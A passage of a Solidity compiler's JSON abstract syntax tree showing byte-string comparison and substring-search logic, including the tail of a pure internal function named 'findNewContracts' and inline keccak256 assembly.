																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 130,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"components": [
																					{
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 124,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"id": 122,
																							"name": "a",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 64,
																							"src": "1966:1:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "&",
																						"rightExpression": {
																							"id": 123,
																							"name": "mask",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 90,
																							"src": "1970:4:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"src": "1966:8:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					}
																				],
																				"id": 125,
																				"isConstant": false,
																				"isInlineArray": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"nodeType": "TupleExpression",
																				"src": "1965:10:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "-",
																			"rightExpression": {
																				"components": [
																					{
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 128,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"id": 126,
																							"name": "b",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 67,
																							"src": "1979:1:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "&",
																						"rightExpression": {
																							"id": 127,
																							"name": "mask",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 90,
																							"src": "1983:4:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"src": "1979:8:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					}
																				],
																				"id": 129,
																				"isConstant": false,
																				"isInlineArray": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"nodeType": "TupleExpression",
																				"src": "1978:10:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "1965:23:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "1950:38:0"
																	},
																	{
																		"condition": {
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 134,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"id": 132,
																				"name": "diff",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 121,
																				"src": "2011:4:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "!=",
																			"rightExpression": {
																				"hexValue": "30",
																				"id": 133,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "2019:1:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_0_by_1",
																					"typeString": "int_const 0"
																				},
																				"value": "0"
																			},
																			"src": "2011:9:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"id": 140,
																		"nodeType": "IfStatement",
																		"src": "2007:52:0",
																		"trueBody": {
																			"expression": {
																				"arguments": [
																					{
																						"id": 137,
																						"name": "diff",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 121,
																						"src": "2054:4:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					],
																					"id": 136,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"lValueRequested": false,
																					"nodeType": "ElementaryTypeNameExpression",
																					"src": "2050:3:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_type$_t_int256_$",
																						"typeString": "type(int256)"
																					},
																					"typeName": {
																						"id": 135,
																						"name": "int",
																						"nodeType": "ElementaryTypeName",
																						"src": "2050:3:0",
																						"typeDescriptions": {}
																					}
																				},
																				"id": 138,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"kind": "typeConversion",
																				"lValueRequested": false,
																				"nameLocations": [],
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "2050:9:0",
																				"tryCall": false,
																				"typeDescriptions": {
																					"typeIdentifier": "t_int256",
																					"typeString": "int256"
																				}
																			},
																			"functionReturnParameters": 31,
																			"id": 139,
																			"nodeType": "Return",
																			"src": "2043:16:0"
																		}
																	}
																]
															}
														},
														{
															"expression": {
																"id": 145,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"id": 143,
																	"name": "selfptr",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 45,
																	"src": "2089:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"hexValue": "3332",
																	"id": 144,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "2100:2:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_32_by_1",
																		"typeString": "int_const 32"
																	},
																	"value": "32"
																},
																"src": "2089:13:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 146,
															"nodeType": "ExpressionStatement",
															"src": "2089:13:0"
														},
														{
															"expression": {
																"id": 149,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"id": 147,
																	"name": "otherptr",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 49,
																	"src": "2117:8:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"hexValue": "3332",
																	"id": 148,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "2129:2:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_32_by_1",
																		"typeString": "int_const 32"
																	},
																	"value": "32"
																},
																"src": "2117:14:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 150,
															"nodeType": "ExpressionStatement",
															"src": "2117:14:0"
														}
													]
												},
												"condition": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 58,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 56,
														"name": "idx",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 53,
														"src": "1102:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"id": 57,
														"name": "shortest",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 33,
														"src": "1108:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1102:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 152,
												"initializationExpression": {
													"assignments": [
														53
													],
													"declarations": [
														{
															"constant": false,
															"id": 53,
															"mutability": "mutable",
															"name": "idx",
															"nameLocation": "1093:3:0",
															"nodeType": "VariableDeclaration",
															"scope": 152,
															"src": "1088:8:0",
															"stateVariable": false,
															"storageLocation": "default",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"typeName": {
																"id": 52,
																"name": "uint",
																"nodeType": "ElementaryTypeName",
																"src": "1088:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"visibility": "internal"
														}
													],
													"id": 55,
													"initialValue": {
														"hexValue": "30",
														"id": 54,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "1099:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"nodeType": "VariableDeclarationStatement",
													"src": "1088:12:0"
												},
												"loopExpression": {
													"expression": {
														"id": 61,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"id": 59,
															"name": "idx",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 53,
															"src": "1118:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "+=",
														"rightHandSide": {
															"hexValue": "3332",
															"id": 60,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1125:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_32_by_1",
																"typeString": "int_const 32"
															},
															"value": "32"
														},
														"src": "1118:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 62,
													"nodeType": "ExpressionStatement",
													"src": "1118:9:0"
												},
												"nodeType": "ForStatement",
												"src": "1083:1060:0"
											},
											{
												"expression": {
													"commonType": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													},
													"id": 161,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"arguments": [
															{
																"id": 155,
																"name": "shortest",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 33,
																"src": "2164:8:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"id": 154,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "2160:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_int256_$",
																"typeString": "type(int256)"
															},
															"typeName": {
																"id": 153,
																"name": "int",
																"nodeType": "ElementaryTypeName",
																"src": "2160:3:0",
																"typeDescriptions": {}
															}
														},
														"id": 156,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"nameLocations": [],
														"names": [],
														"nodeType": "FunctionCall",
														"src": "2160:13:0",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_int256",
															"typeString": "int256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"arguments": [
															{
																"id": 159,
																"name": "shortest",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 33,
																"src": "2180:8:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"id": 158,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "2176:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_int256_$",
																"typeString": "type(int256)"
															},
															"typeName": {
																"id": 157,
																"name": "int",
																"nodeType": "ElementaryTypeName",
																"src": "2176:3:0",
																"typeDescriptions": {}
															}
														},
														"id": 160,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"nameLocations": [],
														"names": [],
														"nodeType": "FunctionCall",
														"src": "2176:13:0",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_int256",
															"typeString": "int256"
														}
													},
													"src": "2160:29:0",
													"typeDescriptions": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													}
												},
												"functionReturnParameters": 31,
												"id": 162,
												"nodeType": "Return",
												"src": "2153:36:0"
											}
										]
									},
									"id": 164,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "findNewContracts",
									"nameLocation": "882:16:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 28,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "898:2:0"
									},
									"returnParameters": {
										"id": 31,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 30,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 164,
												"src": "924:3:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int256",
													"typeString": "int256"
												},
												"typeName": {
													"id": 29,
													"name": "int",
													"nodeType": "ElementaryTypeName",
													"src": "924:3:0",
													"typeDescriptions": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "923:5:0"
									},
									"scope": 1189,
									"src": "873:1324:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 285,
										"nodeType": "Block",
										"src": "2542:1304:0",
										"statements": [
											{
												"assignments": [
													178
												],
												"declarations": [
													{
														"constant": false,
														"id": 178,
														"mutability": "mutable",
														"name": "ptr",
														"nameLocation": "2558:3:0",
														"nodeType": "VariableDeclaration",
														"scope": 285,
														"src": "2553:8:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 177,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "2553:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 180,
												"initialValue": {
													"id": 179,
													"name": "selfptr",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 168,
													"src": "2564:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "2553:18:0"
											},
											{
												"assignments": [
													182
												],
												"declarations": [
													{
														"constant": false,
														"id": 182,
														"mutability": "mutable",
														"name": "idx",
														"nameLocation": "2587:3:0",
														"nodeType": "VariableDeclaration",
														"scope": 285,
														"src": "2582:8:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 181,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "2582:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 183,
												"nodeType": "VariableDeclarationStatement",
												"src": "2582:8:0"
											},
											{
												"condition": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 186,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 184,
														"name": "needlelen",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 170,
														"src": "2607:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<=",
													"rightExpression": {
														"id": 185,
														"name": "selflen",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 166,
														"src": "2620:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2607:20:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 280,
												"nodeType": "IfStatement",
												"src": "2603:1201:0",
												"trueBody": {
													"id": 279,
													"nodeType": "Block",
													"src": "2629:1175:0",
													"statements": [
														{
															"condition": {
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 189,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"id": 187,
																	"name": "needlelen",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 170,
																	"src": "2648:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "<=",
																"rightExpression": {
																	"hexValue": "3332",
																	"id": 188,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "2661:2:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_32_by_1",
																		"typeString": "int_const 32"
																	},
																	"value": "32"
																},
																"src": "2648:15:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": {
																"id": 277,
																"nodeType": "Block",
																"src": "3315:478:0",
																"statements": [
																	{
																		"assignments": [
																			246
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 246,
																				"mutability": "mutable",
																				"name": "hash",
																				"nameLocation": "3392:4:0",
																				"nodeType": "VariableDeclaration",
																				"scope": 277,
																				"src": "3384:12:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 245,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "3384:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"visibility": "internal"
																			}
																		],
																		"id": 247,
																		"nodeType": "VariableDeclarationStatement",
																		"src": "3384:12:0"
																	},
																	{
																		"AST": {
																			"nodeType": "YulBlock",
																			"src": "3424:43:0",
																			"statements": [
																				{
																					"nodeType": "YulAssignment",
																					"src": "3426:39:0",
																					"value": {
																						"arguments": [
																							{
																								"name": "needleptr",
																								"nodeType": "YulIdentifier",
																								"src": "3444:9:0"
																							},
																							{
																								"name": "needlelen",
																								"nodeType": "YulIdentifier",
																								"src": "3455:9:0"
																							}
																						],
																						"functionName": {
																							"name": "keccak256",
																							"nodeType": "YulIdentifier",
																							"src": "3434:9:0"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "3434:31:0"
																					},
																					"variableNames": [
																						{
																							"name": "hash",
																							"nodeType": "YulIdentifier",
																							"src": "3426:4:0"
																						}
																					]
																				}
																			]
																		},
																		"evmVersion": "shanghai",
																		"externalReferences": [
																			{
																				"declaration": 246,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3426:4:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 170,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3455:9:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 172,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3444:9:0",
																				"valueSize": 1
																			}
																		],
																		"id": 248,
																		"nodeType": "InlineAssembly",
																		"src": "3415:52:0"
																	},
																	{
																		"body": {
																			"id": 275,
																			"nodeType": "Block",
																			"src": "3536:242:0",
																			"statements": [
																				{
																					"assignments": [
																						262
																					],
																					"declarations": [
																						{
																							"constant": false,
																							"id": 262,
																							"mutability": "mutable",
																							"name": "testHash",
																							"nameLocation": "3567:8:0",
																							"nodeType": "VariableDeclaration",
																							"scope": 275,
																							"src": "3559:16:0",
																							"stateVariable": false,
																							"storageLocation": "default",
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes32",
																								"typeString": "bytes32"
																							},
																							"typeName": {
																								"id": 261,
																								"name": "bytes32",
																								"nodeType": "ElementaryTypeName",
																								"src": "3559:7:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_bytes32",
																									"typeString": "bytes32"
																								}
																							},
																							"visibility": "internal"
																						}
																					],
																					"id": 263,
																					"nodeType": "VariableDeclarationStatement",
																					"src": "3559:16:0"
																				},
																				{
																					"AST": {
																						"nodeType": "YulBlock",
																						"src": "3607:41:0",
																						"statements": [
																							{
																								"nodeType": "YulAssignment",
																								"src": "3609:37:0",
																								"value": {
																									"arguments": [
																										{
																											"name": "ptr",
																											"nodeType": "YulIdentifier",
																											"src": "3631:3:0"
																										},
																										{
																											"name": "needlelen",
																											"nodeType": "YulIdentifier",
																											"src": "3636:9:0"
																										}
																									],
																									"functionName": {
																										"name": "keccak256",
																										"nodeType": "YulIdentifier",
																										"src": "3621:9:0"
																									},
																									"nodeType": "YulFunctionCall",
																									"src": "3621:25:0"
																								},
																								"variableNames": [
																									{
																										"name": "testHash",
																										"nodeType": "YulIdentifier",
																										"src": "3609:8:0"
																									}
																								]
																							}
																						]
																					},
																					"evmVersion": "shanghai",
																					"externalReferences": [
																						{
																							"declaration": 170,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "3636:9:0",
																							"valueSize": 1
																						},
																						{
																							"declaration": 178,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "3631:3:0",
																							"valueSize": 1
																						},
																						{
																							"declaration": 262,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "3609:8:0",
																							"valueSize": 1
																						}
																					],
																					"id": 264,
																					"nodeType": "InlineAssembly",
																					"src": "3598:50:0"
																				},
																				{
																					"condition": {
																						"commonType": {
																							"typeIdentifier": "t_bytes32",
																							"typeString": "bytes32"
																						},
																						"id": 267,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"id": 265,
																							"name": "hash",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 246,
																							"src": "3674:4:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes32",
																								"typeString": "bytes32"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "==",
																						"rightExpression": {
																							"id": 266,
																							"name": "testHash",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 262,
																							"src": "3682:8:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes32",
																								"typeString": "bytes32"
																							}
																						},
																						"src": "3674:16:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bool",
																							"typeString": "bool"
																						}
																					},
																					"id": 270,
																					"nodeType": "IfStatement",
																					"src": "3670:57:0",
																					"trueBody": {
																						"expression": {
																							"id": 268,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 178,
																							"src": "3724:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"functionReturnParameters": 176,
																						"id": 269,
																						"nodeType": "Return",
																						"src": "3717:10:0"
																					}
																				},
																				{
																					"expression": {
																						"id": 273,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftHandSide": {
																							"id": 271,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 178,
																							"src": "3750:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "Assignment",
																						"operator": "+=",
																						"rightHandSide": {
																							"hexValue": "31",
																							"id": 272,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "number",
																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "3757:1:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_rational_1_by_1",
																								"typeString": "int_const 1"
																							},
																							"value": "1"
																						},
																						"src": "3750:8:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 274,
																					"nodeType": "ExpressionStatement",
																					"src": "3750:8:0"
																				}
																			]
																		},
																		"condition": {
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 257,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"id": 253,
																				"name": "idx",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 182,
																				"src": "3501:3:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "<=",
																			"rightExpression": {
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 256,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"id": 254,
																					"name": "selflen",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 166,
																					"src": "3508:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "-",
																				"rightExpression": {
																					"id": 255,
																					"name": "needlelen",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 170,
																					"src": "3518:9:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"src": "3508:19:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "3501:26:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"id": 276,
																		"initializationExpression": {
																			"expression": {
																				"id": 251,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftHandSide": {
																					"id": 249,
																					"name": "idx",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 182,
																					"src": "3492:3:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "Assignment",
																				"operator": "=",
																				"rightHandSide": {
																					"hexValue": "30",
																					"id": 250,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "3498:1:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_0_by_1",
																						"typeString": "int_const 0"
																					},
																					"value": "0"
																				},
																				"src": "3492:7:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"id": 252,
																			"nodeType": "ExpressionStatement",
																			"src": "3492:7:0"
																		},
																		"loopExpression": {
																			"expression": {
																				"id": 259,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"nodeType": "UnaryOperation",
																				"operator": "++",
																				"prefix": false,
																				"src": "3529:5:0",
																				"subExpression": {
																					"id": 258,
																					"name": "idx",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 182,
																					"src": "3529:3:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"id": 260,
																			"nodeType": "ExpressionStatement",
																			"src": "3529:5:0"
																		},
																		"nodeType": "ForStatement",
																		"src": "3487:291:0"
																	}
																]
															},
															"id": 278,
															"nodeType": "IfStatement",
															"src": "2644:1149:0",
															"trueBody": {
																"id": 244,
																"nodeType": "Block",
																"src": "2665:644:0",
																"statements": [
																	{
																		"assignments": [
																			191
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 191,
																				"mutability": "mutable",
																				"name": "mask",
																				"nameLocation": "2692:4:0",
																				"nodeType": "VariableDeclaration",
																				"scope": 244,
																				"src": "2684:12:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 190,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "2684:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
